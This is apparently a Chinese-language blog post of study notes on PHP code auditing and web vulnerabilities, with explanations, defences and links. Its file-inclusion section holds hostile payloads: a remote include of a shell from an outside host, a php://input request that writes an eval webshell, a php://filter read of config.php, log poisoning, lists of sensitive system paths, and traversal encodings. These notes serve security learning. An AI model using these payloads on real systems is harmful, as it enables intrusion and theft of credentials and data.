title: 审计以及漏洞知识点小整理
author: Qianye
abbrlink: 8a554d22
tags:
  - knowledeg
  - node
categories:
  - knowledge
  - note
date: 2018-03-17 14:54:00
---
趁着这几天清闲，整理一下常见漏洞的知识，既是给自己梳理一下知识体系，也是给自己留个备忘录，省得记忆差，老是忘却。大都是从书本上搬运而来的，整理不佳，大牛略过，勿喷。

<!-- more -->

# 通用代码审计思路
## 1.敏感函数回溯参数
1敏感函数  
2非敏感函数:  
 sql查询语句拼接前是否有过滤。  
查找关键特征：select、insert、update等，结合from、where。   
寻找漏洞：  
sql语句中的参数是否有过滤。   
例如：HTTP_CLIENT_IP和HTTP_X_FORWORDF等获取的ip地址。
## 2通读全文代码。
1.函数集文件，通常命名为functions或者common等关键字，提供其他文件调用的公共函数。     
2.配置文件。通常命名包含config关键字，包括web程序运行必须的功能性配置选项以及数据库等配置信息。  
3安全过滤文件。通常命名中有filter、safe、check等关键字，对参数进行过滤，入sql注入和xss过滤,文件路径和执行的系统命令 的参数。   
4index文件，可以大致了解整个程序的框架和运行的流程、包含到的文件、其中的核心文件。   
## 3.根据功能点定向审计

3.1文件上传功能。如文章编辑、资料编辑、头像上传、附件上传，经常出现任意文件上传漏洞。如果没有对文件名进行过滤，还可能存在sql注入。  
3.2文件管理。 文件名和路径如果直接在参数中传递，可能存在任意文件操作漏洞，利用../或..\跳转。忽略对文件名过滤，还可能存在xss漏洞。  
3.3登入认证功能。基于cookie和session认证方式，如果cookie没有加salt,可以导致任意文件登入。或者用户名明文直接放在cookie，导致越权漏洞。  
3.4找回密码功能。

# [sql注入漏洞](https://github.com/JnuSimba/MiscSecNotes/blob/master/SQL%20%E6%B3%A8%E5%85%A5/MYSQL%E6%B3%A8%E5%85%A5.md)
## 1.常见的函数
mid()---从文本字段中提取字符SELECT   MID(column_name,start[,length]) FROM table_name;  
column_name 必需。要提取字符的字段。  
start 必需。规定开始位置（起始值是 1）。   
length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。   

limit()---返回前几条或者中间某几行数据select * from table limit m,n;   
其m指记录始index0始表示第条记录 n指第m+1条始取n条   

concat、concat_ws、group_concatMySQL的concat函数在连接字符串的 时候，只要其中一个是NULL,那么将返回NULL    
和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL  
group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator '分隔符'])   

Count()---聚集函数，统计元祖的个数  
rand()---用于产生一个0~1的随机数   
floor()---向下取整   
group by---依据我们想要的规则对结果进行分组   
length()---返回字符串的长度   
Substr()---截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）  
sleep() 函数延迟代码执行若干秒。  



## 2.常见注入
1 [limit注入](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)   
2[图片宽字节注入](https://www.waitalone.cn/security-sqlinject-jpg.html)  
3[cookie注入](http://cfyqy.com/posts/53139f85/)   
4post注入  
5[报错注入](http://hacker-chengyu.lofter.com/post/1d1568f4_d192dc5)   
6[布尔盲注](http://www.jb51.net/article/93445.htm)  
7时间盲注   
8[二次注入](http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/)  
9[order by 注入](http://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html)   
10[密码注入](http://cfyqy.com/posts/90656973/)  
11[mysql约束攻击](https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/)  
12[md5加密注入](http://blog.csdn.net/greyfreedom/article/details/45846137)  
13[mysql失败注入](https://www.anquanke.com/post/id/86021)  
14 header 注入  
15 二次查询注入  
16update或insert注入    
 [insert、update和delete报错注入](http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/)    
 [insert、update和delete时间盲注](http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/)  
 [一种新的MySQL下Update、Insert注入方法](https://www.anquanke.com/post/id/85487)  
 17[SQL带外通道注入](https://www.jianshu.com/p/19ef493da938) 
## 3.编码注入
1[宽字节注入注入](https://mp.weixin.qq.com/s/Gu9MTBhZryUrPSAj4GpYDg)     
当`set character_set_client=gbk` 时，很容易存在宽字节注入   
防范方法3种:  
a. 在执行查询之前先执行`SET NAMES 'gbk',charset_set_client=binary`。   
b.使用`mysql_set_charset('gdk')`设置编码，然后使用`mysql_real_escape_string()`函数被参数过滤。   
c.使用pdo方式，在php5.3.6及一下版本需要设置`setAttribute(PDO::ATTR_EMULATE_PREPARES,false)`; 来禁用`prepared statements`的仿真效果。  
2二次urldecode注入   
利用urldecode和rawurldecode函数使用不当   
## 4.sql注入防御

1.gpc/runtime魔术引号
magic_quotes_gpc 负责对GET、POST、COOKIE的值进行过滤。   
magic_quotes_runtime负责对从数据库后者文件中获取的数据进行过滤。  
启用： php4.2.3可以在配置文件和代码的任意地方启用。之后在php.ini、httpd.conf以及.htaccess中开启。  
2.过滤函数  
addslashes 和gpc过滤的值一样，即‘、‘’、\、null   
mysql_[real_]escape_string 函数 ,即\x00、\n、 \r 、\ 、' 、''、 \xla  都是对字符串进行过滤，php4.03以上版本才存在。   
intval等字符转换。  
3.PDO prepare预编译   
## sql注入的一些绕过技巧  
这里有几篇不错的文章  
[sql注入与防御](https://www.anquanke.com/post/id/85936)  
[SQL注入防御与绕过的几种姿势](https://www.anquanke.com/post/id/86005)   
[PHP+Mysql注入防护与绕过](http://www.myh0st.cn/index.php/archives/883/)

# xss漏洞  
跨站脚本攻击（Cross Site Scriptings）,嵌入客户端的恶意脚本代码  ，xss可以盗取用户cookie、黑道网页、改变网页内容。  
审计时寻找没有被过滤的参数，且这些参数传入到输出函数，关键字：print、print_r、echo、printf、sprintf、die、var_dump、var_export。   

## 1.xss类型
1.[反射性xss](https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%8F%8D%E5%B0%84XSS.md)  
简单的把用户输入的数据反射给游览器，需要诱使用户点击一个恶意链接，才能成功，非持久性。   
2.[存储性xss](https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%AD%98%E5%82%A8XSS.md)    
把用户输入的数据存储在服务器。   
3.[DOMxss](https://security.tencent.com/index.php/blog/msg/107)     
实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，从效果上来说也是反射型XSS单独划分出来的，因为DOM Based XSS 的形成原因比较特别。这是由于客户端脚本自身解析不正确导致的安全问题。   
## 2.xss的利用  
1.xss payload   
构造get和post请求   
xss钓鱼   
识别用户的游览器  
识别用户安装的软件  
css History Hack  
获取用户的真实ip  
2.xss  Framework  
attacke api   
beff   
xss-proxy   
3.xss  worm   
## 3.xss的构造   
[XSS现代WAF规则探测及绕过技术](http://www.freebuf.com/articles/web/20282.html)    
[XSS过滤绕过速查表](http://www.freebuf.com/articles/web/153055.html)     
## 4.xss的防御 

[防御XSS的七条原则](http://www.freebuf.com/articles/web/9977.html)  
[XSS 攻击和防御详解](https://juejin.im/entry/58a598dc570c35006b5cd6b4)  
附上一篇前端[解码顺序](https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md)
# [CSRF](https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/CSRF.md)
Cross_site request forgery（跨站请求伪造）   
当我们打开或者登入某个网站后，游览器与网站所存放的服务器将会产生一个会话，在这个会话没有结束时，你就可以利用你的权限对网站进行某些操作。  
## 1.csrf的攻击和防御  
[白帽子挖洞—跨站请求伪造（CSRF）篇](http://www.freebuf.com/column/153543.html)     
[各大SRC中的CSRF技巧](http://www.freebuf.com/column/151816.html)     
[Cookie-Form型CSRF防御机制的不足与反思](https://www.leavesongs.com/PENETRATION/think-about-cookie-form-csrf-protected.html)   
# 文件操作漏洞  
 ## 1.[文件包含漏洞](https://github.com/JnuSimba/MiscSecNotes/blob/master/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.md) 
 
 1.php包含函数：  
 require: 找不到被包含的函数产生致命错误（E_COMPILE_ERROR）,并停止脚本  
 include: 找不到被包含的文件时只会产生警告（E_WARNING），脚本将继续执行  
 include_once:和include类似，包含一次，则不会再包含  
 require_once: 和require类似，包含一次，则不会再包含
 
 本地文件包含   
 
 远程文件包含   
 ```bash
 allow_url_include= off //把off更改为on
 ```
   
 2.文件包含漏洞利用  
 (1)常见敏感信息路径  
  window系统
 ```bash 
 c:\boot.ini    //查看系统版本       
 c:\windows\system32\inetsrv\MetaBase.xml //iis配置文件
 c:\windows\repair\sam  //存储windwos系统初次安装的密码
 c:\Program Files\mysql\my.ini  //mysql配置
 c:\Program Files\mysql\data\mysql\user.MYD //mysql root
 c:\windows\php.ini       //php配置文件
 ```
 UNIX/Linux系统  
```bash
 /etc/passwd   //账户密码
 /usr/local/app/apache2/conf/httpd.comf //apache2默认配置文件
 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf  //虚拟网站设置
 /usr/local/app/php5/lib/php.ini //php相关设置
 /etc/httpd/conf/httpd.conf  //apache配置文件
 /etc/my.cnf  //mysql配置文件
```


 （2）远程包含shell  
 当目标主机allow_url_fopen选项是on,就可以远程包含一句话
 
 http://cfyqy.com/index.php?page=http://www.qianye.com/shell.txt 

 (3)本地包含配合文件上传。  
 上传一句话图片木马到目标网站服务器，再包含该图片。  
 (4)使用[php封装协议](https://lorexxar.cn/2016/09/14/php-wei/)    
 
 ```bash
 file://          访问本地文件系统
 http://          访问http(s)网址
 ftp://           访问ftp(s)urls
 php://           访问输入/输出流  
 zlib://          压缩流   
 data://          数据流   
 sshs://          Secure Shell2 
 expect://        处理交互式的流  
 glob://          查找匹配文件路径   
```
 
 使用封装协议可以读取php文件  
```bash
 http://cfyqy.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php  
```
写入php文件
```bash
 http://cfyqy.com/index.php?page=php://input   
 
 post：<?fputs(fopen("shell.php","w"),"<?php eval($_POst['qianye']);?>"?>
```
  (5）包含apache 日志文件   
 访问   
```bash
 http://cfyqy.com/<?php  phpinfo();?> 
```
 <> 会被url转码，所以要bp修改一下 。   
 发现apache的日志文件路径是重点            
（6）文件包含截断  
%00截断：   
受限于GPC和addslashes等函数过滤，php5.3后，前面修复了该问题   

利用多个英文句号（.）和反斜杠（/）来截断：  
window下240个（.）或者240个（./）,linux下2038个（/.）组合  
不受gpc限制，php5.3之后被修复  

问号（?）来伪截断： 
```bash 
http://cfyqy.com/1.txt == http://cfyqy.com/1.txt?.php 
```
不受gpc和php版本限制  
3.jsp包含：  
(1)静态包含  
```bash
<%@ include file="page.txt" %> 
```
jsp语法规定：  
include指令为静态包含，只允许包含一个已经存在于服务器中的文件，不能使用变量来控制包含某个文件，这意味着使用include指令，将不存在文件包含漏洞  
(2)动态包含  


## 2.文件读取漏洞 
审计时：文件读取的函数列表： file_put_contents()、highlight_file()、fopen()、readfile()、fread()、fgetss()、fgets()、parse_ini_file()、show_source()、file()，还可以利用文件包含include()，php输入输出留php://filter来读取函数   
## 3.[文件上传漏洞](https://github.com/JnuSimba/MiscSecNotes/blob/master/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md)  
审计时： 上传函数move_uploaded_file()  
php会对上传的文件创建临时的文件，其目录在php.ini 的upload_tmp_dir中定义，默认为空。linux下会使用tmp目录，windows下回使用c:\windows\tmp目录  
1.[编译器上传漏洞](https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/)   
2.[绕过文件上传的检查功能](http://www.cnnetarmy.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/)     
%00截断  
白名单绕过  
黑名单绕过 
特殊文件名绕过
文件名大小写绕过
前端js绕过  
文件头、content-type绕过   
3.[文件上传漏洞的防御](https://www.secfree.com/article-585.html)  
文件上传的目录设置为不可执行  
判断文件的类型  
使用随机数改写文件名和文件路径  
单独设置文件服务器的域名  

## 4.[文件解析漏洞](https://github.com/JnuSimba/MiscSecNotes/blob/master/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90.md)  
1.apache文件解析漏洞  
2.iis文件解析问题   
3.php cgi路径解析问题   
附上一篇文章  
[服务器解析漏洞](https://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/) 
## 5.文件删除漏洞  
审计时： 常出现的函数unlink()

## 6.目录遍历漏洞 
可以使用不同的编码来绕过一些服务端逻辑：
```bash
%2e%2e%2f 等同于../  
%2e%2e    等同于../  
..%2f     等同于../  
%2e%2e%5c 等同于../
%2e%2e    等同于..\
%5c       等同于..\
%252e%252e%255c  等同于../ 
..%255c  等同于..\and so on.
```

某些web容器支持的编码方式；
```bash
..%c0%af 等同于../ 
../%c1%9c 等同于 ..\ 
```

# 代码执行漏洞   
用户可以通过请求将代码注入到应用中执行  
审计时： eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()、array_map()等过滤不严、另外还有php的动态函数（$a($b）也是目前出现比较多的  
1.代码执行函数  
(1)eval和assert函数   
(2)preg_replace函数：  
当$pattern 处存在e修饰符是，$replacement的值会被当成php代码执行。  

```bash
<?php 
preg_replace("/\[(.*)\]/e", '\\1',$_GET['str']);
?>
```
    
意思是从变量中搜索括号[]中间的内容作为第一组结果， ‘\\1’代表用第一组结果填充   
(3)调用函数过滤不严： 
call_user_func()和array_map()等数十个函数有调用其他函数的功能 ，其中的一个为参数作为要调用的函数名，如果函数名可控，就可以调用意外的函数，还执行代码  
2.动态代码执行  
php的函数可以直接由字符串拼接。  
例子：
```bash
<?php 
$_GET['a']($_GET['b'])
?>
```

意思是接受get请求的a参数作为函数，b参数作为函数的参数  
3.Curly Syntax   
执行花括号间的代码，并将结果给替换回去
例子   
ls命令列出本地目录的文件  
```bash
<?php 
$var="qian ${`ls`} ye"
?>
```
4.[unserialize()导致代码执行](https://www.anquanke.com/post/id/86452)   
利用条件：  
1.unserialize()参数用户可以控制  
2.__destruct()函数或者   

__wakeup(0函数存在 


# [命令执行漏洞](https://github.com/JnuSimba/MiscSecNotes/blob/master/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md)     
可以执行的系统或者应用指令的漏洞。  
审计时：注意system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()等函数    
1.命令执行函数   
2.反引号命令执行  
反引号执行命令调用的是shell_exec()函数   
3.命令的连接符 &、 &&、 |、||   
4.命令防注入函数    
escapeshellcms()过滤整条命令  
escapeshellarg() 过滤参数   
# [变量覆盖漏洞](http://blog.csdn.net/Liuhuaijin/article/details/77331419)  
用户自定义的参数可以替换程序原有的变量值。  
审计时：注意的函数extract()和parse_str()  
import_request_variables()
1.import_request_variables   
将get、post、cookie中的变量导入到全局，第二个参数没有指定将导致变量覆盖   
相当于开启全局变量注册，在php4~4.10和php5~5.40可用，php5.4后被取消       
2.parse_str()   
用于解析url的query string  
3.extract()  
将变量从数组导入当前的符号表  
4.register_globals=on  
变量将自动赋值，不用初始化，php4.20之后默认为off   
5.$$变量覆盖  

# 逻辑处理漏洞  
程序逻辑错误导致的  
## 1.等于与存在判断绕过  
1.in_arrray(）函数  
判断一个值是否在某个数组中 
举个例子： 
/?qianye=1q
```bash
<?php 
if(in_array($_GET['qianye'],array(1,2,3,4)))
{
  //执行语句
}else{
 }
```
2.is_numeric函数  
当传入参数为hex时直接通过并返回true,而mysql是可以枝江使用hex编码代替字符串明文的。虽然不能直接注入sql语句，但是可能存在二次注入和xss等漏洞隐患。  
3.双等于和三等于  
双等于在判断等于之前会先做变量类型转换，而三等于不会   
## 2.[越权访问](https://mp.weixin.qq.com/s/ChiXtcrEyQeLkGOkm4PTog)  
## 3.[支付漏洞](https://mp.weixin.qq.com/s/w22omfxO8vU6XzixXWmBxg)  
## 4.[密码重置漏洞](https://mp.weixin.qq.com/s/Lynmqd_ieEoNJ3mmyv9eQQ)  
# [会话认证漏洞]()
1.cookie攻击  
2.session保持攻击



# [点击劫持](https://github.com/JnuSimba/MiscSecNotes/blob/master/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/clickjacking.md)  
是一种视觉欺骗手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置。   
# [ssrf](https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)   
SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）    
# 代码注入  
客户端所提交的数据未经检查就让web服务器去执行。   
## 1.[xml外部实体注入](https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md) 
xml可扩展标识语言，主要用来传输数据，而非显示数据。   
## 2.[xpath注入](http://www.freebuf.com/articles/web/23184.html) 
xpath即xml路径语言 
## 3.[jsonp注入](http://www.freebuf.com/articles/web/126347.html)  
JSON（JavaSript Object Notation）是一种轻量级的数据交换格式   
# 加密算法与随机数  
常见的加密算法，为分组加密算法和流加密算法两种。   
分组加密算法基于“分组”进行操作，代表算法有DES、3-DES、 Blowfish、 IDEA 、AES    
流加密算法，每次只处理一个字节，密钥独立于消息之外，两者通过异或实现加密于解密，代表算法有RC4、ORYX、SEAL   
## 1.Stream Ciper Attack 
1.Reused Key Attack  
使用同一个密钥进行多次加密、解密。   
假设有 密钥C,明文A,明文B,那么，XOR加密可表示为：
```bash
E(A)=A xor C 
E(B)=B xor C 
```
密文是知道的，因此容易计算：
```bash
E(A) xor E(B) =(A xor C ) xor(B xor C )=A xor B
```
此时只要知道3个便可以推算出剩下一个，密钥C完全不需要。
2.Bit-flipping Attack  

攻击者在不知道明文的情况下，通过改变密文，使得明文按其需要的方式发生改变的攻击方式。 
通过
```bash
E(A) xor E(B) =A xor B
```

得到
```bash
A xor E(A) xor B= E(B)
```
例子： 
比如加入一个网站用cookie作为身份验证，cookie通过xor加密而来，明文假设为usenam+role ,便可通过注册一个账号，推导出管理员的cookie  
常见解决方法，增加带有KEY的MAC,通过MAC验证密文是否被修改。通过哈希算法来实现的MAC，称为HMAC。  
3.弱随机数iv. 

## 2.ECB模式缺陷
简单的分组加密，改变分组密文的顺序，将改变解密后的明文顺序；替换某个分组密文，解密后该对应分组的明文也会被替换，而其他分组不受影响。
## 3.[Padding Oracle Attack](http://www.freebuf.com/articles/system/163756.html)  

## 4.[伪随机数问题](http://5alt.me/2017/06/php%E9%87%8C%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0/)  
[伪随机数的破解](http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/)   
伪随机数是由数学算法实现的，它真正随机的地方在于“种子”，种子一旦确定后，再通过同一伪随机数算法计算出来的随机数，其值是固定的，多次计算所得的值的顺序也是固定的。  
## 5.[Length Extension Attack](http://www.freebuf.com/articles/web/31756.html)
# [DDOS攻击](https://www.secpulse.com/archives/64088.html)  
利用合理的请求造成资源过载，导致服务不可用。 

</br>
粗略的整理一下，等以后接触更多了，再慢慢的补充。
</br>

</br>


参考文献:    
https://book.douban.com/subject/10546925/   
https://book.douban.com/subject/26673087/  
https://book.douban.com/subject/26348894/  
https://github.com/JnuSimba/MiscSecNotes